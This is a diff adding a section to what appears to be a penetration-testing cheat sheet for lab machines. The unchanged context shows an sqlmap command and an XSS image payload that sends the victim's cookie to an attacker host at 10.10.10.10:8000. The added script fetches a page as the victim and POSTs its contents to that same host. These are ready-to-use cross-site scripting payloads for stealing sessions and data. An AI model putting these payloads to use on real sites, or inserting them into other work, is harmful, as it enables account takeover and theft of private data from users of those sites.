@@ -254,6 +254,26 @@ sqlmap -r request.txt -p <target_param> -D <DB_name> -T <TABLE_name> -C <column_
 <img src=x onerror="this.src='http://10.10.10.10:8000/steal?cookie='+document.cookie;">
 ```
 
+### Unauthorized Resource Access
+```javascript
+<script>
+    async function fetchData() {
+        let response = await fetch('http://xxxx.htb/test.php');
+        // console.log(response);
+        let text = await response.text();
+        // console.log(text);
+        let res = await fetch('http://10.10.10.10:8000/steal', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'text/plain'
+            },
+            body: text
+        });
+    }
+    fetchData();
+</script>
+```
+
 
 # Linux Privilege Escalation
 
